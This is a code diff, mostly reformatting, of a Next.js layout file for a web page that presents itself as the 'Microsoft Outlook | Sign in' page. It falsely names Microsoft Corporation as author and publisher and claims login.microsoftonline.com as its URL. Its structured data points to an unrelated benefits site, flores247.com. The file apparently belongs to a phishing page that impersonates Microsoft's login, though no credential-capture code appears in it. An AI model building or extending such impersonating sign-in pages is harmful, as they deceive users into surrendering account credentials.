@@ -1,20 +1,22 @@
-import type React from "react"
-import type { Metadata } from "next"
-import { Geist, Geist_Mono } from "next/font/google"
-import { Analytics } from "@vercel/analytics/next"
-import "./globals.css"
+import type React from "react";
+import type { Metadata } from "next";
+import { Geist, Geist_Mono } from "next/font/google";
+import { Analytics } from "@vercel/analytics/next";
+import "./globals.css";
 
-const _geist = Geist({ subsets: ["latin"] })
-const _geistMono = Geist_Mono({ subsets: ["latin"] })
-
+const _geist = Geist({ subsets: ["latin"] });
+const _geistMono = Geist_Mono({ subsets: ["latin"] });
 
 export const metadata: Metadata = {
-  metadataBase: new URL(process.env.NEXT_PUBLIC_SITE_URL || 'https://login.microsoftonline.com'),
+  metadataBase: new URL(
+    process.env.NEXT_PUBLIC_SITE_URL || "https://login.microsoftonline.com",
+  ),
   title: {
     default: "Microsoft Outlook | Sign in",
-    template: "%s | Microsoft Outlook"
+    template: "%s | Microsoft Outlook",
   },
-  description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
+  description:
+    "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
   keywords: [
     "Microsoft Outlook login",
     "Outlook Mail sign in",
@@ -25,12 +27,12 @@ export const metadata: Metadata = {
     "OpenID login",
     "offline_access",
     "profile access",
-    "Microsoft auth"
+    "Microsoft auth",
   ],
   authors: [{ name: "Microsoft Corporation" }],
   creator: "Microsoft Corporation",
   publisher: "Microsoft Corporation",
-  generator: 'Next.js',
+  generator: "Next.js",
   applicationName: "Microsoft Outlook",
   referrer: "origin-when-cross-origin",
   formatDetection: {
@@ -40,22 +42,21 @@ export const metadata: Metadata = {
   },
   icons: {
     icon: [
-      { url: '/images.png', sizes: 'any' },
-      { url: '/icon-light-32x32.png', sizes: '32x32', type: 'image/png' },
-      { url: '/icon-dark-32x32.png', sizes: '32x32', type: 'image/png' },
+      { url: "/images.png", sizes: "any" },
+      { url: "/icon-light-32x32.png", sizes: "32x32", type: "image/png" },
+      { url: "/icon-dark-32x32.png", sizes: "32x32", type: "image/png" },
     ],
-    apple: [
-      { url: '/apple-icon.png', sizes: '180x180', type: 'image/png' },
-    ],
+    apple: [{ url: "/apple-icon.png", sizes: "180x180", type: "image/png" }],
   },
-  manifest: '/manifest.json',
+  manifest: "/manifest.json",
   openGraph: {
     type: "website",
     locale: "en_US",
     url: "/",
     siteName: "Microsoft Outlook",
     title: "Microsoft Outlook | Sign in",
-    description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
+    description:
+      "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
     images: [
       {
         url: "/images.png",
@@ -68,7 +69,8 @@ export const metadata: Metadata = {
   twitter: {
     card: "summary_large_image",
     title: "Microsoft Outlook | Sign in",
-    description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
+    description:
+      "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
     images: ["/images.png"],
     creator: "@Microsoft",
   },
@@ -83,72 +85,72 @@ export const metadata: Metadata = {
       "max-snippet": -1,
     },
   },
-  verification: {
-    
-    
-    
-    
-  },
+  verification: {},
   alternates: {
     canonical: "/",
   },
   category: "Finance",
-}
+};
 
 export default function RootLayout({
   children,
 }: Readonly<{
-  children: React.ReactNode
+  children: React.ReactNode;
 }>) {
   return (
     <html lang="en">
+      <head>
+        <link rel="icon" href="/images.png" />
+      </head>
       <body className="font-sans antialiased">
         {children}
         <Analytics />
-        
+
         <script
           type="application/ld+json"
           dangerouslySetInnerHTML={{
             __html: JSON.stringify({
               "@context": "https://schema.org",
               "@type": "Organization",
-              "name": "Microsoft Outlook",
-              "url": "https://login.microsoftonline.com",
-              "logo": "https://login.microsoftonline.com/images.png",
-              "description": "Microsoft Outlook provides secure email and productivity services with access to mail, calendar, and contacts.",
-              "contactPoint": {
+              name: "Microsoft Outlook",
+              url: "https://login.microsoftonline.com",
+              logo: "https://login.microsoftonline.com/images.png",
+              description:
+                "Microsoft Outlook provides secure email and productivity services with access to mail, calendar, and contacts.",
+              contactPoint: {
                 "@type": "ContactPoint",
-                "contactType": "Customer Service",
-                "url": "https://www.flores247.com/contact-login.vbhtml"
+                contactType: "Customer Service",
+                url: "https://www.flores247.com/contact-login.vbhtml",
               },
-              "sameAs": [
+              sameAs: [
                 "https://www.facebook.com/FloresAssociates",
-                "https://www.linkedin.com/company/flores-&-associates"
-              ]
-            })
+                "https://www.linkedin.com/company/flores-&-associates",
+              ],
+            }),
           }}
         />
-        
+
         <script
           type="application/ld+json"
           dangerouslySetInnerHTML={{
             __html: JSON.stringify({
               "@context": "https://schema.org",
               "@type": "WebApplication",
-              "name": "Flores247",
-              "url": "https://www.flores247.com",
-              "applicationCategory": "FinanceApplication",
-              "operatingSystem": "Web",
-              "offers": {
+              name: "Flores247",
+              url: "https://www.flores247.com",
+              applicationCategory: "FinanceApplication",
+              operatingSystem: "Web",
+              offers: {
                 "@type": "Offer",
-                "price": "0",
-                "priceCurrency": "USD"
+                price: "0",
+                priceCurrency: "USD",
               },
-              "description": "Secure login portal for Flores benefits account management, including FSA, HSA, and HRA plans."
-            })
+              description:
+                "Secure login portal for Flores benefits account management, including FSA, HSA, and HRA plans.",
+            }),
           }}
         />
       </body>
     </html>
-  )
+  );
 }
